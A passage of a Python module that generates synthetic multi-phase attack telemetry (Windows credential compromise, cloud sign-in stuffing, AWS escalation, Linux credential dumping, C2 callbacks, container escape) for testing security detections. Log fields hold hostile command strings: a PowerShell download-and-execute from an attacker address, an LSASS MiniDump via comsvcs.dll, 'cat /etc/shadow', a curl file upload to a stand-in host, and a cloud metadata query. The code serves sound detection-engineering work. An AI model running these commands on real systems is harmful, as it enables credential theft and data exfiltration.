# =========================================================================
# AUTO-GENERATED PACKAGED COPY — DO NOT EDIT DIRECTLY!
# Authoritative Source of Truth: src/netspout_core/authentic_scenario_packs.py
# Re-generate using: python3 scripts/sync_core.py
# =========================================================================
"""
Authentic Scenario Packs (Wave 2)
=================================
Executable multi-phase, multi-event sequences over the Wave-1 + Wave-2
authentic engine surface. Each pack:

  * emits the intended vendor-native RAW sourcetypes (engine formatters only,
    no fabricated formats)
  * threads correlation metadata (netspout_run_id / netspout_scenario_id /
    netspout_phase / netspout_event_id / netspout_parent_event_id) ONLY on
    LogEntry fields (HEC-side), never inside RAW
  * records causal linkage: detection events reference the event id of the
    triggering activity
  * is deterministic per run_id (crc-derived field tokens, staged timestamps)

The catalog declarations live in catalog/scenarios.json
(wave2_* ids, maturity CONTRACTED). This module is the executable layer;
scenario contracts end-to-end are validated in tests.

NOTE: emitting a scenario event is NOT detection validation. These packs
generate telemetry; detection coverage must be proven by real searches.
"""

import zlib
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional

try:
    from netspout_core.models import LogEntry, Node, NodeType
    from netspout_core.wave1_authentic_engine import Wave1AuthenticEngine as W1
    from netspout_core.wave2_authentic_engine import Wave2AuthenticEngine as W2
    from netspout_core.wave3_authentic_engine import Wave3AuthenticEngine as W3
    from netspout_core.universe_batch1_engine import UniverseBatch1Engine as UB1
except ImportError:  # pragma: no cover
    try:
        from app.models import LogEntry, Node, NodeType
        from app.wave1_authentic_engine import Wave1AuthenticEngine as W1
        from app.wave2_authentic_engine import Wave2AuthenticEngine as W2
        from app.wave3_authentic_engine import Wave3AuthenticEngine as W3
        from app.universe_batch1_engine import UniverseBatch1Engine as UB1
    except ImportError:
        from models import LogEntry, Node, NodeType
        from wave1_authentic_engine import Wave1AuthenticEngine as W1
        from wave2_authentic_engine import Wave2AuthenticEngine as W2
        from wave3_authentic_engine import Wave3AuthenticEngine as W3
        from universe_batch1_engine import UniverseBatch1Engine as UB1


SCENARIO_PACK_IDS = [
    "wave2_ws_credential_compromise_chain",
    "wave2_cloud_identity_sso_hunt",
    "wave2_aws_recon_escalation",
    "wave2_linux_auth_anomaly",
    "wave2_agentic_ai_exfil_attempt",
    "wave2_k8s_container_escape",
    "wave2_c2_callback_detection",
    "wave2_bigip_openconfig_itops",
    "wave3_ebpf_workload_hunt",
    "wave3_cloudmail_exfil",
    "wave3_vsphere_hostpath_triage",
    "ub1_ot_proxy_host_hunt",
    "ub2_cloud_identity_mail_hunt",
    "ub2_ot_edge_routing_observation",
    "ub2_database_backup_integrity",
    "ub3_identity_runtime_audit",
    "ub3_multivendor_edge_observation",
    "ub3_database_message_audit",
    "ub4_saas_collaboration_audit",
    "ub4_endpoint_threat_pipeline",
    "ub4_exposure_infra_logging",
    "ub5_cisco_change_induced_outage",
    "ub5_cisco_platform_health_degradation",
    "ub5_cisco_nac_radius_outage",
    "ub6_sdwan_utd_threat_pipeline",
    "ub6_catalyst_wireless_rogue_threat",
]


def _sha(seed: str) -> str:
    return f"{zlib.crc32(seed.encode('utf-8')):08x}"


def _tag(entries, run_id: str, scenario_id: str, phase: str,
         parent_map: Optional[Dict[str, str]] = None) -> List[LogEntry]:
    """Thread run/phase/scenario metadata onto LogEntry fields only.

    Accepts nested lists (some formatters return correlated pairs).
    """
    flat: List[LogEntry] = []
    for item in entries:
        if isinstance(item, (list, tuple)):
            flat.extend(item)
        else:
            flat.append(item)
    entries = flat
    tagged: List[LogEntry] = []
    seq = 0
    prev_id = None
    for e in entries:
        seq += 1
        event_id = f"{scenario_id}-{phase}-{seq}"
        e.netspout_run_id = run_id
        e.netspout_scenario_id = scenario_id
        e.netspout_phase = phase
        e.netspout_event_id = event_id
        e.netspout_parent_event_id = prev_id
        if parent_map and event_id in parent_map:
            e.netspout_ground_truth = parent_map[event_id]
        prev_id = event_id
        tagged.append(e)
    return tagged


def _host(kind: str, run_id: str) -> str:
    return f"{kind}-{_sha(kind + run_id)[:6].upper()}"


def _ip(seed: str, run_id: str) -> str:
    n = (zlib.crc32((seed + run_id).encode()) >> 8) & 0xffff
    return f"10.42.{(n >> 8) % 250}.{n % 250 + 1}"


def run_scenario_pack(scenario_id: str, run_id: Optional[str] = None,
                      source_ip: str = "203.0.113.66") -> List[LogEntry]:
    """Run a Wave-2 authentic scenario pack; returns ordered LogEntry list."""
    if run_id is None:
        run_id = f"pf-wave2-{int(datetime.now(timezone.utc).timestamp())}"
    if scenario_id == "wave2_ws_credential_compromise_chain":
        return _ws_credential_chain(run_id, source_ip)
    if scenario_id == "wave2_cloud_identity_sso_hunt":
        return _cloud_identity_sso_hunt(run_id, source_ip)
    if scenario_id == "wave2_aws_recon_escalation":
        return _aws_recon(run_id, source_ip)
    if scenario_id == "wave2_linux_auth_anomaly":
        return _linux_auth_anomaly(run_id, source_ip)
    if scenario_id == "wave2_agentic_ai_exfil_attempt":
        return _agentic_exfil(run_id, source_ip)
    if scenario_id == "wave2_k8s_container_escape":
        return _k8s_escape(run_id, source_ip)
    if scenario_id == "wave2_c2_callback_detection":
        return _c2_callback(run_id, source_ip)
    if scenario_id == "wave2_bigip_openconfig_itops":
        return _itops_window(run_id, source_ip)
    if scenario_id == "wave3_ebpf_workload_hunt":
        return _ebpf_workload_hunt(run_id, source_ip)
    if scenario_id == "wave3_cloudmail_exfil":
        return _cloudmail_exfil(run_id, source_ip)
    if scenario_id == "wave3_vsphere_hostpath_triage":
        return _vsphere_hostpath_triage(run_id, source_ip)
    if scenario_id == "ub1_ot_proxy_host_hunt":
        return _ub1_ot_proxy_host_hunt(run_id, source_ip)
    if scenario_id.startswith("ub2_"):
        try:
            from netspout_core.universe_batch2_engine import run_batch2_scenario
        except ImportError:
            try:
                from app.universe_batch2_engine import run_batch2_scenario
            except ImportError:
                from universe_batch2_engine import run_batch2_scenario
        return run_batch2_scenario(scenario_id, run_id, _tag, source_ip)
    if scenario_id.startswith("ub3_"):
        try:
            from netspout_core.universe_batch3_engine import run_batch3_scenario
        except ImportError:
            try:
                from app.universe_batch3_engine import run_batch3_scenario
            except ImportError:
                from universe_batch3_engine import run_batch3_scenario
        return run_batch3_scenario(scenario_id, run_id, _tag, source_ip)
    if scenario_id.startswith("ub4_"):
        try:
            from netspout_core.universe_batch4_engine import run_batch4_scenario
        except ImportError:
            try:
                from app.universe_batch4_engine import run_batch4_scenario
            except ImportError:
                from universe_batch4_engine import run_batch4_scenario
        return run_batch4_scenario(scenario_id, run_id, _tag, source_ip)
    if scenario_id.startswith("ub5_"):
        try:
            from netspout_core.universe_batch5_engine import run_batch5_scenario
        except ImportError:
            try:
                from app.universe_batch5_engine import run_batch5_scenario
            except ImportError:
                from universe_batch5_engine import run_batch5_scenario
        return run_batch5_scenario(scenario_id, run_id, _tag, source_ip)
    if scenario_id.startswith("ub6_"):
        try:
            from netspout_core.universe_batch6_engine import run_batch6_scenario
        except ImportError:
            try:
                from app.universe_batch6_engine import run_batch6_scenario
            except ImportError:
                from universe_batch6_engine import run_batch6_scenario
        return run_batch6_scenario(scenario_id, run_id, _tag, source_ip)
    raise ValueError(f"Unknown authentic scenario pack: {scenario_id}")


def run_all_scenario_packs(run_id: Optional[str] = None) -> Dict[str, List[LogEntry]]:
    rid = run_id or f"pf-wave2-{int(datetime.now(timezone.utc).timestamp())}"
    return {sid: run_scenario_pack(sid, rid) for sid in SCENARIO_PACK_IDS}


# ---------------------------------------------------------------------------
# Pack implementations
# ---------------------------------------------------------------------------

def _ws_credential_chain(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-win-workstation", name=_host("WINWS", run_id),
                  type=NodeType.WEB_SERVER, ip_address="10.42.7.31")
    secs: List[LogEntry] = []
    host = device.name

    # Phase 1 baseline
    secs.extend(_tag(W1.format_windows_security_xml_log(
        device=device, family="logon_success", actor_user="jrestate",
        actor_domain="CORP", src_ip="10.42.7.88", host_name=host),
        run_id, "wave2_ws_credential_compromise_chain", "BASELINE"))
    # Phase 2 recon: 4625 bursts
    recon: List[LogEntry] = []
    recon.extend(W1.format_windows_security_xml_log(
        device=device, family="logon_failure", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        signature="credential-stuffing", status="breached"))
    recon.append(W2.format_windows_ntlm_xml_log(
        device=device, family="client_request", host_name=host, src_ip=attacker,
        user_name="CORP\\svc-ldap", signature="ntlm-chase", status="breached"))
    secs.extend(_tag(recon, run_id, "wave2_ws_credential_compromise_chain",
                     "RECON_CREDENTIAL_FAILURES"))

    # Phase 3 initial access: 4624+4672 pair, then 4688
    access: List[LogEntry] = []
    access.extend(W1.format_windows_security_xml_log(
        device=device, family="logon_success", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        signature="lateral-logon", status="breached"))
    proc = W1.format_windows_security_xml_log(
        device=device, family="process_creation", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        status="breached")
    secs.extend(_tag(access[:2], run_id,
                     "wave2_ws_credential_compromise_chain", "INITIAL_ACCESS"))
    # process creation (4688) is its own entry with parent linkage
    secs.extend(_tag(proc, run_id, "wave2_ws_credential_compromise_chain",
                     "INITIAL_ACCESS"))

    # Phase 4 execution: PowerShell + sysmon
    exe: List[LogEntry] = []
    exe.append(W1.format_windows_powershell_xml_log(
        device=device, family="script_block", host_name=host, src_ip=attacker,
        script_block="IEX (New-Object Net.WebClient).DownloadString('http://%s/p.ps1')"
                     % attacker,
        user="CORP\\svc-ldap", status="breached", signature="ps-scriptblock"))
    exe.append(W1.format_windows_sysmon_xml_log(
        device=device, family="process_create", host_name=host,
        src_ip=attacker, dest_ip=_ip("c2", run_id),
        process_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc SQBFAFgA",
        user="CORP\\svc-ldap", status="breached", signature="sysmon-proc"))
    exe.append(W1.format_windows_sysmon_xml_log(
        device=device, family="dns_query", host_name=host, src_ip=attacker,
        dest_ip=_ip("c2", run_id),
        process_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc SQBFAFgA",
        user="CORP\\svc-ldap", status="breached", signature="sysmon-dns"))
    secs.extend(_tag(exe, run_id, "wave2_ws_credential_compromise_chain",
                     "EXECUTION"))

    # Phase 5 credential access: lsass + NTLM
    cred: List[LogEntry] = []
    cred.append(W1.format_windows_sysmon_xml_log(
        device=device, family="process_access", host_name=host,
        src_ip=attacker, dest_ip=device.ip_address,
        process_image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump",
        user="CORP\\svc-ldap", status="breached", signature="lsass-access"))
    cred.append(W1.format_windows_security_xml_log(
        device=device, family="file_access", actor_user="svc-ldap",
        actor_domain="CORP", src_ip=attacker, host_name=host,
        status="breached"))
    cred.append(W1.format_windows_sysmon_xml_log(
        device=device, family="image_loaded", host_name=host,
        src_ip=attacker, dest_ip=device.ip_address,
        process_image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump",
        user="CORP\\svc-ldap", status="breached", signature="sysmon-imgload"))
    secs.extend(_tag(cred, run_id, "wave2_ws_credential_compromise_chain",
                     "CREDENTIAL_ACCESS"))

    # Phase 6 detection: EDR + Defender
    det: List[LogEntry] = []
    det.extend(W1.format_crowdstrike_falcon_sensor_log(
        device=device, family="DetectSummaryEvent", src_ip=attacker,
        dest_ip=_ip("c2", run_id),
        process_image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump",
        user="CORP\\svc-ldap", status="breached"))
    det.append(W2.format_windows_defender_xml_log(
        device=device, family="detection", host_name=host, src_ip=attacker,
        threat_name="Trojan:Win32/Wacatac.B!ml", status="breached"))
    det.append(W2.format_windows_defender_xml_log(
        device=device, family="remediation", host_name=host, src_ip=attacker,
        threat_name="Trojan:Win32/Wacatac.B!ml", status="blocked"))
    secs.extend(_tag(det, run_id, "wave2_ws_credential_compromise_chain",
                     "EDR_RESPONSE"))
    return secs


def _cloud_identity_sso_hunt(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-id-cloud-edge", name="id-cloud-edge",
                  type=NodeType.CLOUD_TRANSIT, ip_address="10.42.8.4")
    secs: List[LogEntry] = []

    # Baseline successful sign-ins across vendors
    base: List[LogEntry] = []
    base.append(W1.format_o365_management_log(
        device=device, family="user_login", src_ip="10.42.8.21",
        user_id="analyst@contoso.com"))
    base.append(W1.format_azure_monitor_aad_log(
        device=device, family="sign_in_success", src_ip="10.42.8.21",
        status="normal"))
    base.append(W1.format_okta_log(device=device, family="user_session_start",
                                   src_ip="10.42.8.21"))
    base.append(W2.format_gws_login_log(device=device, family="login_success",
                                        src_ip="10.42.8.21",
                                        actor_email="analyst@contoso.com",
                                        status="normal"))
    secs.extend(_tag(base, run_id, "wave2_cloud_identity_sso_hunt", "BASELINE"))

    # Credential stuffing: M365 + Entra + Okta + GWS failures
    attack: List[LogEntry] = []
    for op_user in ("finance@contoso.com", "helpdesk@contoso.com",
                    "analyst@contoso.com"):
        evts = W1.format_o365_management_log(
            device=device, family="user_login_failed", src_ip=attacker,
            user_id=op_user, signature="o365-stuffing", status="breached")
        attack.extend(evts if isinstance(evts, (list, tuple)) else [evts])
        attack.append(W1.format_azure_monitor_aad_log(
            device=device, family="sign_in_failure", src_ip=attacker,
            signature="entra-stuffing", status="breached"))
        attack.append(W2.format_gws_login_log(device=device,
                                              family="login_failure",
                                              src_ip=attacker,
                                              actor_email=op_user,
                                              signature="gws-stuffing",
                                              status="breached"))
    attack.append(W1.format_okta_log(
        device=device, family="policy_signon_denial", src_ip=attacker,
        user_email="finance@contoso.com", signature="okta-deny",
        action="blocked"))
    # Evidenced Wave-1 okta extension: suspicious activity report
    attack.append(W1.format_okta_log(
        device=device, family="suspicious_activity_report",
        src_ip="10.42.8.21", user_email="analyst@contoso.com",
        status="normal"))
    secs.extend(_tag(attack, run_id, "wave2_cloud_identity_sso_hunt",
                     "CREDENTIAL_STUFFING"))

    # Escalation: role grant in Azure Activity Log (authentic pinned schema)
    esc: List[LogEntry] = []
    esc.append(W2.format_azure_activity_log(
        device=device, family="admin_action", src_ip=attacker,
        operation_name="Add role assignment to directory role",
        signature="entra-role-escalation", status="breached"))
    esc.append(W2.format_azure_activity_log(
        device=device, family="alert_action", src_ip=attacker,
        signature="azure-alert", status="breached"))
    secs.extend(_tag(esc, run_id, "wave2_cloud_identity_sso_hunt", "ESCALATION"))
    return secs


def _aws_recon(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-aws-cloud", name="aws-cloud-ingress",
                  type=NodeType.CLOUD_TRANSIT, ip_address="10.42.9.4")
    secs: List[LogEntry] = []

    base = W1.format_aws_cloudtrail_log(
        device=device, family="console_login", src_ip="10.42.9.21",
        status="normal")
    secs.extend(_tag(base if isinstance(base, (list, tuple)) else [base],
                     run_id, "wave2_aws_recon_escalation", "BASELINE"))

    # Console login failure burst (failed console logins)
    attack: List[LogEntry] = []
    for _i in range(3):
        evts = W1.format_aws_cloudtrail_log(
            device=device, family="console_login", src_ip=attacker,
            status="breached", signature="aws-stuffing")
        attack.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    secs.extend(_tag(attack, run_id, "wave2_aws_recon_escalation",
                     "LOGIN_FAILURES"))

    # Privilege escalation: AssumeRole + RunInstances + PutRolePolicy
    esc: List[LogEntry] = []
    for fam in ("assume_role", "run_instances", "put_role_policy"):
        evts = W1.format_aws_cloudtrail_log(
            device=device, family=fam, src_ip=attacker,
            status="breached", signature="aws-escalation")
        esc.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    secs.extend(_tag(esc, run_id, "wave2_aws_recon_escalation",
                     "PRIVILEGE_ESCALATION"))

    # Network activity: VPC flow ACCEPT/REJECT/SKIPDATA mix
    net: List[LogEntry] = []
    net.append(W2.format_aws_vpcflow_log(device=device, family="flow_accept",
                                         src_ip="10.42.9.21",
                                         dest_ip="10.42.9.55",
                                         dest_port=443))
    net.append(W2.format_aws_vpcflow_log(device=device, family="flow_reject",
                                         src_ip=attacker,
                                         dest_ip="10.42.9.55",
                                         dest_port=22, status="blocked",
                                         action="blocked"))
    net.append(W2.format_aws_vpcflow_log(device=device, family="flow_skipdata",
                                         src_ip="-", dest_ip="-"))
    secs.extend(_tag(net, run_id, "wave2_aws_recon_escalation", "NETWORK_VALIDATE"))
    return secs


def _linux_auth_anomaly(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-linux-host", name=_host("NIX", run_id),
                  type=NodeType.WEB_SERVER, ip_address="10.42.10.17")
    secs: List[LogEntry] = []

    # Baseline: normal sshd accept + auditd syscall reads
    base: List[LogEntry] = []
    base.append(W2.format_linux_messages_log(
        device=device, family="sshd_message", src_ip="10.42.10.50",
        message="Accepted publickey for netops from 10.42.10.50 port 49304 "
                "ssh2: RSA SHA256:%s" % _sha("ssh|ok|" + run_id)))
    secs.extend(_tag(base, run_id, "wave2_linux_auth_anomaly", "BASELINE"))

    # Brute force: sshd failure bursts + linux messages
    attack: List[LogEntry] = []
    for pwd_user in ("admin", "root", "oracle"):
        attack.append(W2.format_linux_messages_log(
            device=device, family="sshd_message", src_ip=attacker,
            message="Failed password for invalid user %s from %s port %d "
                    "ssh2" % (pwd_user, attacker, 49872 + (len(pwd_user) % 90)),
            status="breached"))
        evts = W1.format_linux_auditd_log(
            device=device, family="user_auth_failure", src_ip=attacker,
            account=pwd_user, status="breached")
        attack.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    secs.extend(_tag(attack, run_id, "wave2_linux_auth_anomaly", "BRUTE_FORCE"))

    # Credential access: execve of /etc/shadow + sudo root usage
    cred: List[LogEntry] = []
    evts = W1.format_linux_auditd_log(
        device=device, family="syscall_execve", src_ip=attacker,
        target_exe="/usr/bin/cat", target_args="/etc/shadow",
        status="breached")
    cred.extend(evts if isinstance(evts, (list, tuple)) else [evts])
    cred.append(W2.format_linux_messages_log(
        device=device, family="sudo_message", src_ip=attacker,
        status="breached"))
    cred.append(W1.format_sysmon_linux_log(
        device=device, family="process_create", src_ip=attacker,
        dest_ip=device.ip_address,
        process_image="/bin/cat", command_line="cat /etc/shadow",
        user="root", status="breached", signature="sysmon-linux-proc"))
    secs.extend(_tag(cred, run_id, "wave2_linux_auth_anomaly", "CRED_DUMP"))
    return secs


def _agentic_exfil(run_id: str, attacker: str) -> List[LogEntry]:
    ollama_dev = Node(id="wave2-ollama-runtime", name="ollama-runtime",
                      type=NodeType.CLOUD_TRANSIT, ip_address="10.42.11.8")
    agent_dev = Node(id="wave2-mcp-agent", name="mcp-agent-host",
                     type=NodeType.CLOUD_TRANSIT, ip_address="10.42.11.9")
    secs: List[LogEntry] = []

    # Baseline inference + server lifecycle
    base: List[LogEntry] = []
    for fam in ("server_config", "model_store", "gpu_inventory", "runner_wait"):
        base.append(W2.format_ollama_server_log(device=ollama_dev, family=fam))
    base.append(W2.format_mcp_jsonrpc_log(device=agent_dev,
                                          family="server_lifecycle",
                                          src_ip="10.42.11.9"))
    secs.extend(_tag(base, run_id, "wave2_agentic_ai_exfil_attempt", "BASELINE"))

    # Sensitive tool call from the agent
    tool: List[LogEntry] = []
    tool.append(W2.format_mcp_jsonrpc_log(
        device=agent_dev, family="request", src_ip=attacker,
        tool_name="fs.read_file",
        tool_args={"path": "C:\\Users\\Administrator\\Documents\\credentials.txt"},
        signature="mcp-sensitive", status="breached"))
    tool.append(W2.format_ollama_server_log(
        device=ollama_dev, family="runner_wait", src_ip=attacker,
        status="breached"))
    tool.append(W1.format_osquery_results_log(
        device=agent_dev, family="processes", src_ip=attacker,
        status="breached", signature="osquery-proc"))
    secs.extend(_tag(tool, run_id, "wave2_agentic_ai_exfil_attempt",
                     "SENSITIVE_TOOL_CALL"))

    # Deny + audit
    den: List[LogEntry] = []
    den.append(W2.format_mcp_jsonrpc_log(
        device=agent_dev, family="error", src_ip=attacker,
        signature="mcp-deny", status="blocked", action="blocked"))
    secs.extend(_tag(den, run_id, "wave2_agentic_ai_exfil_attempt",
                     "TOOL_POLICY_DENY"))
    return secs


def _k8s_escape(run_id: str, attacker: str) -> List[LogEntry]:
    cluster = Node(id="wave2-k8s-cluster", name="k8s-apiserver",
                   type=NodeType.CLOUD_TRANSIT, ip_address="10.42.12.9")
    node = Node(id="wave2-k8s-node", name="k8s-worker-1",
                type=NodeType.CLOUD_TRANSIT, ip_address="10.42.12.11")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W2.format_kube_audit_log(device=cluster, family="pod_create",
                                         src_ip="10.42.12.50"))
    secs.extend(_tag(base, run_id, "wave2_k8s_container_escape", "BASELINE"))

    probe: List[LogEntry] = []
    probe.append(W2.format_kube_audit_log(device=cluster, family="secret_read",
                                          src_ip=attacker,
                                          status="breached"))
    probe.append(W2.format_kube_audit_log(
        device=cluster, family="exec_into_pod", src_ip=attacker,
        status="breached"))
    secs.extend(_tag(probe, run_id, "wave2_k8s_container_escape", "RBAC_PROBE"))

    esc: List[LogEntry] = []
    esc.append(W2.format_falco_log(device=node, family="terminal_shell",
                                   src_ip=attacker))
    esc.append(W2.format_falco_log(device=node, family="sensitive_file_read",
                                   src_ip=attacker))
    esc.append(W2.format_falco_log(device=node, family="write_below_etc",
                                   src_ip=attacker, status="breached"))
    secs.extend(_tag(esc, run_id, "wave2_k8s_container_escape",
                     "CONTAINER_ESCAPE"))

    det: List[LogEntry] = []
    det.append(W1.format_suricata_eve_log(
        device=node, family="alert", src_ip=_ip("c2", run_id),
        dest_ip=node.ip_address, dest_port=443, proto="TCP",
        status="breached"))
    det.append(W1.format_osquery_results_log(
        device=node, family="open_sockets", src_ip=attacker,
        status="breached", signature="osquery-socket"))
    secs.extend(_tag(det, run_id, "wave2_k8s_container_escape", "DETECTION"))
    return secs


def _c2_callback(run_id: str, attacker: str) -> List[LogEntry]:
    device = Node(id="wave2-sase-edge", name="mixed-sase-edge",
                  type=NodeType.SASE_PROXY, ip_address="10.42.13.6")
    host = Node(id="wave2-c2-victim", name=_host("VICTIM", run_id),
                type=NodeType.WEB_SERVER, ip_address="10.42.13.44")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W1.format_suricata_eve_log(device=device, family="http",
                                           src_ip=host.ip_address,
                                           dest_ip="93.184.216.34",
                                           dest_port=80, proto="TCP",
                                           status="normal"))
    secs.extend(_tag(base, run_id, "wave2_c2_callback_detection", "BASELINE"))

    call: List[LogEntry] = []
    call.append(W1.format_suricata_eve_log(
        device=device, family="alert", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=443, proto="TCP",
        signature="et-malware-c2", status="breached"))
    call.append(W1.format_suricata_eve_log(
        device=device, family="dns_query", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=53, proto="UDP",
        signature="c2-dns", status="breached"))
    call.append(W1.format_suricata_eve_log(
        device=device, family="tls", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=443, proto="TCP",
        signature="c2-tls", status="breached"))
    call.append(W1.format_suricata_eve_log(
        device=device, family="fileinfo", src_ip=host.ip_address,
        dest_ip=attacker, dest_port=443, proto="TCP",
        signature="c2-file", status="breached"))
    secs.extend(_tag(call, run_id, "wave2_c2_callback_detection", "CALLBACK"))

    dis: List[LogEntry] = []
    dis.append(W1.format_osquery_results_log(
        device=host, family="open_sockets", src_ip=host.ip_address,
        status="breached", signature="osquery-socket"))
    dis.append(W1.format_osquery_results_log(
        device=host, family="processes", src_ip=host.ip_address,
        status="breached", signature="osquery-proc"))
    secs.extend(_tag(dis, run_id, "wave2_c2_callback_detection", "DISCOVERY"))
    return secs


def _itops_window(run_id: str, attacker: str) -> List[LogEntry]:
    adc = Node(id="wave2-bigip-adc", name="bigip-adc-01",
               type=NodeType.LOAD_BALANCER, ip_address="10.42.14.3")
    fw = Node(id="wave2-estreamer-fw", name="cisco-sfr-fw",
              type=NodeType.FIREWALL, ip_address="10.42.14.4")
    node = Node(id="wave2-nvm-endpoint", name="nvm-endpoint-01",
                type=NodeType.WEB_SERVER, ip_address="10.42.14.77")
    ftp = Node(id="wave2-crushftp", name="crushftp-01",
               type=NodeType.WEB_SERVER, ip_address="10.42.14.20")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W2.format_cisco_sfw_estreamer_log(
        device=fw, family="intrusion_event", src_ip="10.42.14.100",
        dest_ip=ftp.ip_address, status="normal"))
    base.append(W2.format_cisco_nvm_v2_log(
        device=node, family="nvzflow_v11_record", src_ip=node.ip_address,
        dest_ip="104.20.23.154", dest_port=80, status="normal"))
    base.append(W2.format_crushftp_log(device=ftp, family="session_login",
                                       src_ip="10.42.14.100",
                                       user="ops_archivist"))
    secs.extend(_tag(base, run_id, "wave2_bigip_openconfig_itops", "BASELINE"))

    win: List[LogEntry] = []
    win.append(W2.format_crushftp_log(
        device=ftp, family="session_command_read", src_ip=attacker,
        signature="crushftp-exploit", status="breached", action="alerted"))
    win.append(W2.format_cisco_sfw_estreamer_log(
        device=fw, family="intrusion_event", src_ip=attacker,
        dest_ip=ftp.ip_address,
        intrusion_message="SERVER-WEBAPP CrushFTP zip INCLUDE path traversal attempt",  # noqa
        classification="Web Application Attack", status="breached"))
    win.append(W2.format_crushftp_log(device=ftp, family="session_transfer",
                                      src_ip="10.42.14.100",
                                      user="ops_archivist"))
    secs.extend(_tag(win, run_id, "wave2_bigip_openconfig_itops", "MAINTENANCE"))

    dr: List[LogEntry] = []
    dr.append(W2.format_cisco_nvm_v2_log(
        device=node, family="nvzflow_v11_record", src_ip=node.ip_address,
        dest_ip=_ip("c2", run_id), dest_port=443,
        process_path="/usr/bin/curl",
        process_args="curl -F file=@invoice_q1.csv https://files.example.com/u",
        status="breached"))
    secs.extend(_tag(dr, run_id, "wave2_bigip_openconfig_itops", "DRIFT"))
    return secs


# ---------------------------------------------------------------------------
# Wave-3 packs: Splunkbase-scale expansion telemetry sequences
# ---------------------------------------------------------------------------

def _ebpf_workload_hunt(run_id: str, attacker: str) -> List[LogEntry]:
    """Tetragon eBPF workload hunt: pod exec -> connect -> edge proxy"""
    k8s = Node(id="wave3-ebpf-podnode", name="ip-10-0-10-253",
               type=NodeType.WEB_SERVER, ip_address="10.42.21.7")
    edge = Node(id="wave3-csl-edge", name="cloudsec-proxy",
                type=NodeType.SASE_PROXY, ip_address="10.42.21.9")
    zeek_sensor = Node(id="wave3-zeek-sensor", name="zeek-sensor-01",
                       type=NodeType.FIREWALL, ip_address="10.42.21.4")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W3.format_cisco_isovalent_log(
        device=k8s, family="process_exec", src_ip=k8s.ip_address,
        dest_ip="104.20.23.154",
        arguments="curl https://example.com/health",
        status="normal"))
    base.append(W3.format_zeek_conn_json_log(
        device=zeek_sensor, family="conn", src_ip=k8s.ip_address,
        dest_ip="10.42.21.20", dest_port=22, service="ssh",
        history="ShADadFf", status="normal"))
    secs.extend(_tag(base if isinstance(base, (list, tuple)) else [base],
                     run_id, "wave3_ebpf_workload_hunt", "BASELINE"))

    probe: List[LogEntry] = []
    probe.append(W3.format_cisco_cloud_security_dns_log(
        device=edge, family="dns_query", src_ip=k8s.ip_address,
        dest_ip="3.151.127.146", domain="pastebin-pool.com.",
        categories="Proxy/Anonymizer,Application", status="degraded"))
    secs.extend(_tag(probe, run_id, "wave3_ebpf_workload_hunt", "DEGRADE"))

    execs: List[LogEntry] = []
    execs.append(W3.format_cisco_isovalent_log(
        device=k8s, family="process_exec", src_ip=k8s.ip_address,
        dest_ip=attacker,
        arguments="-sS -m 4 https://%s/pool" % attacker,
        status="breached", action="alerted",
        sourcetype="cisco:isovalent:processExec"))
    execs.append(W3.format_cisco_cloud_security_proxy_log(
        device=edge, family="proxy_http", src_ip=k8s.ip_address,
        dest_ip=attacker, user_agent="gobuster/3.8.1",
        url="http://%s/css-4411" % attacker, uri_suffix="css-4411",
        signature="webrecon", status="breached"))
    secs.extend(_tag(execs, run_id, "wave3_ebpf_workload_hunt", "FAULT"))

    escape: List[LogEntry] = []
    escape.append(W3.format_cisco_isovalent_log(
        device=k8s, family="process_connect", src_ip=k8s.ip_address,
        dest_ip="169.254.169.254", dest_port=80,
        arguments="-sS -H \"Metadata: true\" "
                  "http://169.254.169.254/metadata/instance",
        status="breached", action="alerted",
        sourcetype="cisco:isovalent:processConnect"))
    escape.append(W3.format_zeek_conn_json_log(
        device=zeek_sensor, family="conn", src_ip=k8s.ip_address,
        dest_ip=attacker, dest_port=3389, service="rdp",
        conn_state="S1", history="ShADdF", status="breached"))
    secs.extend(_tag(escape, run_id, "wave3_ebpf_workload_hunt", "PROPAGATE"))

    icmp_exfil: List[LogEntry] = []
    icmp_exfil.append(W3.format_cisco_cloud_security_firewall_log(
        device=edge, family="conn_s2c_icmp", src_ip=k8s.ip_address,
        dest_ip=attacker, action="ALLOW", signature="icmp-tunnel",
        status="breached"))
    secs.extend(_tag(icmp_exfil, run_id, "wave3_ebpf_workload_hunt",
                     "VALIDATE"))

    forensics: List[LogEntry] = []
    forensics.append(W3.format_opentelemetry_otlp_log(
        device=k8s, family="log_record", src_ip=k8s.ip_address,
        dest_ip="10.42.21.9", body="workload quarantine completed",
        severity="ALERT", signature="otel-quarantine",
        status="breached"))
    forensics.append(W3.format_gcp_audit_log(
        device=k8s, family="admin_activity", src_ip="10.42.21.2",
        dest_ip="34.84.0.1", method_name="v1.compute.instances.stop",
        instance="forensic-rerun", signature="gcp-forensic"))
    secs.extend(_tag(forensics, run_id, "wave3_ebpf_workload_hunt",
                     "VALIDATE"))
    return secs


def _cloudmail_exfil(run_id: str, attacker: str) -> List[LogEntry]:
